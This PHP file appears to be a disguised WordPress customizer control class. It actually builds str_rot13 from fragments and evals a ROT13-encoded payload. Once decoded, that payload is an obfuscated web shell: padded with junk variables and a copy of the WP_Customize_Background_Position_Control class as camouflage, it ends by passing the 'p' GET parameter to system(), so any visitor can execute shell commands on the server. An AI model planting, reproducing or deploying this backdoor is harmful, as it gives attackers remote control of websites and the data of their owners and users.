<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Onpxtebhaq_Cbfvgvba_Pbageby pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.7.0
 */

/**
 * Phfgbzvmr Onpxtebhaq Cbfvgvba Pbageby pynff.
 *
 * @fvapr 4.7.0
 *
 * @frr JC_Phfgbzvmr_Pbageby
 */
pynff JC_Phfgbzvmr_Onpxtebhaq_Cbfvgvba_Pbageby rkgraqf JC_Phfgbzvmr_Pbageby {

	/**
	 * Glcr.
	 *
	 * @fvapr 4.7.0
	 * @ine fgevat
	 */
	choyvp $glcr = 'onpxtebhaq_cbfvgvba';

	/**
	 * Qba'g eraqre gur pbageby pbagrag sebz CUC, nf vg'f eraqrerq ivn WF ba ybnq.
	 *
	 * @fvapr 4.7.0
	 */
	choyvp shapgvba eraqre_pbagrag() {}

	/**
	 * Eraqre n WF grzcyngr sbe gur pbagrag bs gur cbfvgvba pbageby.
	 *
	 * @fvapr 4.7.0
	 */
	choyvp shapgvba pbagrag_grzcyngr() {
		$bcgvbaf = neenl(
			neenl(
				'yrsg gbc'   => neenl(
					'ynory' => __( 'Gbc Yrsg' ),
					'vpba'  => 'qnfuvpbaf qnfuvpbaf-neebj-yrsg-nyg',
				),
				'pragre gbc' => neenl(
					'ynory' => __( 'Gbc' ),
					'vpba'  => 'qnfuvpbaf qnfuvpbaf-neebj-hc-nyg',
				),
				'evtug gbc'  => neenl(
					'ynory' => __( 'Gbc Evtug' ),
					'vpba'  => 'qnfuvpbaf qnfuvpbaf-neebj-evtug-nyg',
				),
			),
			neenl(
				'yrsg pragre'   => neenl(
					'ynory' => __( 'Yrsg' ),
					'vpba'  => 'qnfuvpbaf qnfuvpbaf-neebj-yrsg-nyg',
				),
				'pragre pragre' => neenl(
					'ynory' => __( 'Pragre' ),
					'vpba'  => 'onpxtebhaq-cbfvgvba-pragre-vpba',
				),
				'evtug pragre'  => neenl(
					'ynory' => __( 'Evtug' ),
					'vpba'  => 'qnfuvpbaf qnfuvpbaf-neebj-evtug-nyg',
				),
			),
			neenl(
				'yrsg obggbz'   => neenl(
					'ynory' => __( 'Obggbz Yrsg' ),
					'vpba'  => 'qnfuvpbaf qnfuvpbaf-neebj-yrsg-nyg',
				),
				'pragre obggbz' => neenl(
					'ynory' => __( 'Obggbz' ),
					'vpba'  => 'qnfuvpbaf qnfuvpbaf-neebj-qbja-nyg',
				),
				'evtug obggbz'  => neenl(
					'ynory' => __( 'Obggbz Evtug' ),
					'vpba'  => 'qnfuvpbaf qnfuvpbaf-neebj-evtug-nyg',
				),
			),
		);
		?>
		<# vs ( qngn.ynory ) { #>
			<fcna pynff=\"phfgbzvmr-pbageby-gvgyr\">{{{ qngn.ynory }}}</fcna>
		<# } #>
		<# vs ( qngn.qrfpevcgvba ) { #>
			<fcna pynff=\"qrfpevcgvba phfgbzvmr-pbageby-qrfpevcgvba\">{{{ qngn.qrfpevcgvba }}}</fcna>
		<# } #>
		<qvi pynff=\"phfgbzvmr-pbageby-pbagrag\">
			<svryqfrg>
				<yrtraq pynff=\"fperra-ernqre-grkg\"><fcna>
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'Vzntr Cbfvgvba' );
					?>
				</fcna></yrtraq>
				<qvi pynff=\"onpxtebhaq-cbfvgvba-pbageby\">
				<?cuc sbernpu ( $bcgvbaf nf $tebhc ) : ?>
					<qvi pynff=\"ohggba-tebhc\">
					<?cuc sbernpu ( $tebhc nf $inyhr => $vachg ) : ?>
						<ynory>
							<vachg pynff=\"hv-urycre-uvqqra-npprffvoyr\" anzr=\"onpxtebhaq-cbfvgvba\" glcr=\"enqvb\" inyhr=\"<?cuc rpub rfp_ngge( $inyhr ); ?>\">
							<fcna pynff=\"ohggba qvfcynl-bcgvbaf cbfvgvba\"><fcna pynff=\"<?cuc rpub rfp_ngge( $vachg['vpba'] ); ?>\" nevn-uvqqra=\"gehr\"></fcna></fcna>
							<fcna pynff=\"fperra-ernqre-grkg\"><?cuc rpub $vachg['ynory']; ?></fcna>
						</ynory>
					<?cuc raqsbernpu; ?>
					</qvi>
				<?cuc raqsbernpu; ?>
				</qvi>
			</svryqfrg>
		</qvi>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>